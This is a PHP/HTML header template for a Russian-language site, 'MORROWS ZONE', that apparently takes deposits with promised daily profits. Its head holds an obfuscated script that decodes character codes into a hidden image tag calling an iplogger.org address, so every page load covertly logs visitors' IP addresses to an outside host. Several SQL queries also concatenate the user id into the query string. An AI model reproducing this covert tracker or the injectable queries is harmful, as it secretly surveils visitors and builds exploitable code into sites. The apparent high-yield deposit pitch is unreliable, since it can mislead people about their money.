<?
if(!defined('SCRIPT_BY_SIRGOFFAN')){
exit();
}
?>
<html>
<head>
<meta charset="UTF-8">
<meta content="/morrows.png">
<title>MORROWS ZONE</title>
<link rel="icon" href="/img/logo.png">
<link rel="stylesheet" href="/css/fonts.css">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>
		$(document).ready(function(){
			setInterval(function(){
				$('.countdown').each(function(){
					var time=$(this).text().split(':');
					var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
					var hours=Math.floor(timestamp/3600);
					var minutes=Math.floor((timestamp- hours*3600)/ 60);
					var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}
					
				if(minutes<10){minutes='0'+ minutes;}
				if(seconds<10){seconds='0'+ seconds;}
				if(timestamp>0){
				$(this).text(hours+':'+ minutes+':'+ seconds);
				}else{
				$(this).text('Выплачивается');	
				}
				});
		},1000);

		})
		</script>
<style>
.container {
    width: 1170px !important;
}

</style>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!86!121!74!77!54!34!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>
<body class="home">
<?if(!empty($_error)){?><div class="stat" style="display: inline-block;font-size: 14px;color: rgb(255, 255, 255);z-index: 10;right: 23px;bottom: 20px;box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 3px;border: 1px solid rgba(255, 255, 255, 0);line-height: 1.72857143;position: fixed;width: 300px;background: #000000c2;padding: 10px;border-radius: 4px;z-index: 999999;font-family: 'Montserrat', sans-serif;font-weight: 400;"><center><font><?=$_error?></font></div></center><?}?>

<?

$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$refsprofit=$db->query("SELECT SUM(summa) as payed FROM deposits WHERE curatorid=?i",$id);
$refsprofit=$db->fetch($refsprofit);
$payed=$refsprofit['payed']*($refpercent/100);
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
$refsprofit=$db->query("SELECT SUM(summa) as waited FROM deposits WHERE status=?i AND curatorid=?i",0,$id);
$refsprofit=$db->fetch($refsprofit);
$waited=$refsprofit['waited']*($refpercent/100);
$last_ip=$db->getOne("SELECT last_ip FROM ss_users WHERE id=?i",$id);
$reg_unix=$db->getOne("SELECT reg_unix FROM ss_users WHERE id=?i",$id);
$opened=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",0));
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",1));
$Users=$db->numRows($db->query("SELECT id FROM ss_users"));
$avatar=$db->getOne("SELECT avatar FROM ss_users WHERE id=?i",$id);
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",1));
$AmountDeposits=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type='Оплата депозита'");
$PayDeposits=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type!='Оплата депозита'");

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '1' and `userid`='".$id."'")->fetch();
$num1 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '0' and `userid`='".$id."'")->fetch();
$num2 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '1' and `userid`='".$id."'")->fetch();
$num4 = $sql['SUM(summa)'];

$sql = $pdo->Query("SELECT SUM(summa) FROM `deposits` WHERE `status` = '2' and `userid`='".$id."'")->fetch();
$num3 = $sql['SUM(summa)'];

?>
<div class="main-page-wrapper">
<div id="loader-wrapper">
<div id="loader"></div>
</div>
<?php if($_SERVER['REQUEST_URI']=='/' && $_SERVER['REQUEST_URI']!='/index' or $_GET['ref']!='') {  ?>
<div class="lider">
<header class="theme-menu-two transparent-menu">
<div class="main-header">
<div class="container">
<div class="logo float-left" style="margin-left: 20px;">
<img src="/img/logo.png" style="position: absolute;width: 60px;margin-left: -10px;margin-top: -5px;">
<a href="/" style="color: #ffffff!important;font-size: 23px;font-weight: 900;text-decoration: none;line-height: 26px;font-family: 'Montserrat', sans-serif;padding-left: 53px;text-shadow: 0 8px 31px rgba(0, 0, 0, 0.02);">MORROWS<br><font>ZONE</font></a>
</div>
<div class="btc-to-usd">
<i class="fa fa-bitcoin" style="font-size: 28px;position: absolute;color: #ffffff;margin-left: -30px;margin-top: 15px;"></i>
                <p class="btc-to-usd__title">BTC\RUB</p>
                <div class="btc-price">
<div class="btcwdgt-price btcwdgt btcwdgt-s-price btcwdgt-text-ticker btcwdgt-light btcwdgt-clean" bw-theme="light"  bw-cur="rub"></div>
                </div>
              </div>
<div class="menu-wrapper float-right">
				   			<nav id="mega-menu-holder" class="menuzord menuzord-responsive">
							   <ul class="menuzord-menu menuzord-indented scrollable">
							      <li><a href="/">Главная</a></li>
                                  <li><a href="/about"> О проекте</a></li>
								  <li><a href="/rules"> Правила</a></li>
                                  <li><a href="/faq"> FAQ</a></li>
                                  <li><a href="/contacts"> Контакты</a></li>
								  <li><a href="https://vk.com/morrows_zone" target="_blank"><i class="fa fa-vk"></i></a></li>
								 

							   </ul>
							</nav> 
				   		</div> 
					</div> 
				</div>
			</header>
	
	
	
	
	
<div id="banner">
<div class="rev_slider_wrapper">
<div id="business-main-banner">
<div class="tp-caption text-center"><h1>MORROWS ZONE</h1></div>
<div class="tp-caption text-center">
<p>Теперь у каждого желающего есть возможность стать частью нашей команды <br> и начать зарабатывать вместе с нами! </p></div>

<?if(empty($id)){?>
<div class="tp-caption text-center">
<style>
label {
    position: relative;
    display: inline-block;
    width: 50px;
    height: 50px;
    cursor: pointer;
    border-radius: 50px;
    box-shadow: 0 12px 20px -10px rgba(21, 148, 193, 0.09), 0 4px 20px 0px rgba(0, 0, 0, 0.12), 0 7px 8px -5px rgb(18, 157, 183);
    padding: 6px;
    margin-top: 1px;
	background: #fff;
}

</style>


<script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"></script>
							<script>
								var recBtn;
								function recaptchaCall(token) {
									$('#formreg').trigger('submit');
								}
								var onloadCallback = function() {
									recBtn = grecaptcha.render('recBtn', {
										'sitekey' : '6LfOCVkUAAAAACXoQNxS1kbi2zqE4RxHoShx_stI',
										'callback' : recaptchaCall
									});
								};
								var resetCaptcha = function () {
									grecaptcha.reset(recBtn);
								}
							</script>
<script>
$( document ).ready(function() {

$('#tps label').on('click', function(event) {
	$('#tps label').css('opacity','0.5');
    $(this).css('opacity','2');

	$('#wallet').attr('placeholder',$(this).attr('placeholder'));
    $('#wallet').attr('preg',$(this).attr('preg'));
	 $('#wallet').attr('pname',$(this).attr('pname'));
});

});
</script>
<form action="" method="post" id="formreg">
<div id='tps' style="position: absolute;margin-left: 270px;margin-top: 37px;">
<center>
<label placeholder="PXXXXXXX" preg='^[pP][0-9]{7,15}$' pname='Payeer' style="margin-right: 6px;opacity: 2;"><img style="margin: 0.6px 0px 3px 0px;" src="/img/payeer.png"  width="50"></label>
<label placeholder="Qiwi (+7XXXXXXXXXX)"  preg='^\+\d{9,15}$' pname='Qiwi' style="margin-right: 6px;opacity: 0.5;"><img style="margin: 0px 0px -3px 0px;" src="/img/qiwi.png" width="50"></label>	
<label placeholder="user@advcash.com" preg='^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$' pname='Advcash' style="margin-right: 6px;opacity: 0.5;"><img style="margin: 0px 0px -3px 0px;" src="/img/advcash.png" width="50"></label>	
<label  placeholder="41001XXXXXXXXXX" preg='^41001[0-9]+$' pname='Yandex' style="opacity: 0.5;"><img style="margin: 0px 0px -3px 0px;" src="/img/yandex.png" width="50"></label>
</center>
</div>
<input type="hidden" name="do" value="toaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<input type="text"   name="wallet" id='wallet' preg='^[pP][0-9]{7,15}$' pname='Payeer'  placeholder="PXXXXXXX" size="23" maxlength="35" style="width: 410px;margin-right: 2px;text-align: left;height: 50px;padding-left: 30px;border-radius: 25px 25px 25px 25px;outline: none;font-size: 16px;position: relative;z-index: 999999;line-height: 50px;padding-right: 200px;margin-top: 39px;border: 1px solid #fff;margin-left: 273px;" autocomplete="off">
<button type="submit" name="submit" id="form" style="border-radius: 25px 25px 25px 25px;padding: 12px 30px;margin-left: -179px;outline: none;z-index: 999999;margin-top: -4px;background: #1ba7b6;color: #fff;font-size: 15px;font-family: 'Montserrat', sans-serif;font-weight: 500;box-shadow: 0 12px 20px -10px rgba(21, 148, 193, 0.09), 0 4px 20px 0px rgba(0, 0, 0, 0.12), 0 7px 8px -5px rgb(17, 148, 190);" class="waves-effect waves-light" id="recBtn"> Войти в аккаунт</button>
</form>
<h2 style="font-size: 15px;margin-top:10px;margin-left:10px;text-align: center;text-shadow: 1px 1px 2px rgba(6, 6, 6, 0.07);text-transform: none;font-weight: 400;color: #fff;">Выберите платежную систему и введите кошелек!</h2>
</div>
<? } else { ?>
<div class="tp-caption text-center">
<a href="/account" style="border-radius: 25px 25px 25px 25px;padding: 3px 20px;outline: none;z-index: 999999;margin-top: -4px;background: #1ba7b6;color: #fff;font-size: 15px;font-family: 'Montserrat', sans-serif;font-weight: 500;box-shadow: 0 12px 20px -10px rgba(21, 148, 193, 0.09), 0 4px 20px 0px rgba(0, 0, 0, 0.12), 0 7px 8px -5px rgb(17, 148, 190);border: none;margin-top: 35px;margin-bottom: 35px;" class="waves-effect waves-light">ВЕРНУТЬСЯ В КАБИНЕТ</a>
</div>
<?PHP } ?> 

<div class="tp-caption">
<div class="block-head">
<h1 style="font-size: 19px;margin-top: 45px;margin-bottom: 40px;letter-spacing: 1px;font-weight: 900;">Всего 3 простых шага</h1>
          <div class="d-flex mb-4">
          <img src="/images/1.svg" alt="">
          <span>Пройдите несложную регистрацию</span>
          </div>
          <div class="d-flex mb-4">
          <img src="/images/2.svg" alt="">
          <span>Введите сумму и оплатите депозит</span>
          </div>      
          <div class="d-flex mb-4">
          <img src="/images/3.svg" alt="">
          <span>Получайте ежедневно прибыль</span>
          </div> 
          </div>
<img src="/images/object.png" alt="Image" style="width: 1196px;height: 472px;margin-top: 0px;position: relative;">



<div class="col-md-23">			   
<div class="row">
<div style="padding: 0px;margin-top: 2px;">
<table class="table table-striped">
<thead style="color: #0e0e0f;font-family: 'Montserrat', sans-serif;font-weight: 500;font-size: 15px;"> 
<tr style="border-bottom: 2px solid #ededed;">
<td>Дата</td>
<td>Кошелек</td>
<td>Эпс</td>
<td>Тип операции</td>
<td>Сумма</td>
</tr> 
</thead>
<tbody style="color: #000000b5;">  
<? 
$checkdeps=$db->getOne("SELECT * FROM `pay` ORDER BY id DESC limit 1"); 
if($checkdeps>0){ 
$depositsrow=$db->query("SELECT * FROM `pay` ORDER BY id DESC limit 8");
while($deposits=$db->fetch($depositsrow)){?>  
<?
if($deposits['userid']!=0){
$user=$db->getOne("SELECT user FROM `ss_users` WHERE id=?i",$deposits['userid']); 
$wallets=$db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']); 
}else{
$wallets=$deposits['wallet'];
}
$wallet=substr($wallets, 2, -3); 
?> 
<tr>
<td><?=date('d.m.Y H:i',$deposits['data'])?></td>
<td>** <?=$wallet?> ***</td>
<td><? if(preg_match('/^[pP][0-9]{7,15}$/',$wallets)){ echo '<img src="/img/payeer.png" style="width: 18px;">'; }elseif(preg_match('/^41001[0-9]+$/',$wallets)){ echo '<img src="/img/yandex.png" style="width: 18px;">';} elseif(preg_match('/^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/',$wallets)) { echo '<img src="/img/advcash.png" style="width: 18px;">';} elseif(preg_match('/^\+\d{9,15}$/',$wallets)) { echo '<img src="/img/qiwi.png" style="width: 18px;">';}?></td>
<td><?=$deposits['type']?></td>
<td style="font-weight: 600;font-family: 'Montserrat', sans-serif;"><?=$deposits['summa']?> <i class="fa fa-rub"></i></td>
</tr>
<?}}else{?> 
      
<td colspan="5" style="text-align: center;">Статистика финансовых операций еще не сформирована :(</td> 
 
<?}?> 
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>



</div>
<? } else { ?>


<div class="lider" style="height: 130px;box-shadow: 0px 0px 25px 5px rgba(0, 0, 0, 0.09);position: relative;">
<header class="theme-menu-two transparent-menu">
<div class="main-header fixed">
<div class="container">
<div class="logo float-left" style="margin-left: 20px;">
<img src="/img/logo.png" style="position: absolute;width: 60px;margin-left: -10px;margin-top: -6px;">
<a href="/" style="color: #ffffff!important;font-size: 23px;font-weight: 900;text-decoration: none;line-height: 26px;font-family: 'Montserrat', sans-serif;padding-left: 53px;text-shadow: 0 8px 31px rgba(0, 0, 0, 0.02);">MORROWS<br><font>ZONE</font></a>
</div>
<div class="btc-to-usd">
<i class="fa fa-bitcoin" style="font-size: 28px;position: absolute;color: #ffffff;margin-left: -30px;margin-top: 15px;"></i>
                <p class="btc-to-usd__title">BTC\RUB</p>
                <div class="btc-price">
<div class="btcwdgt-price btcwdgt btcwdgt-s-price btcwdgt-text-ticker btcwdgt-light btcwdgt-clean" bw-theme="light"  bw-cur="rub"></div>
                </div>
              </div>

				   		<div class="menu-wrapper float-right">
				   			<nav id="mega-menu-holder" class="menuzord menuzord-responsive">
							   <ul class="menuzord-menu menuzord-indented scrollable">
							      <li><a href="/">Главная</a></li>
                                  <li><a href="/about"> О проекте</a></li>
							      <li><a href="/rules"> Правила</a></li>
                                  <li><a href="/faq"> FAQ</a></li>
                                  <li><a href="/contacts"> Контакты</a></li>
								  <li><a href="https://vk.com" target="_blank"><i class="fa fa-vk"></i></a></li>

							   </ul>
							</nav> 
				   		</div> 
					</div> 
				</div> 
			</header>
</div>
<?php } ?>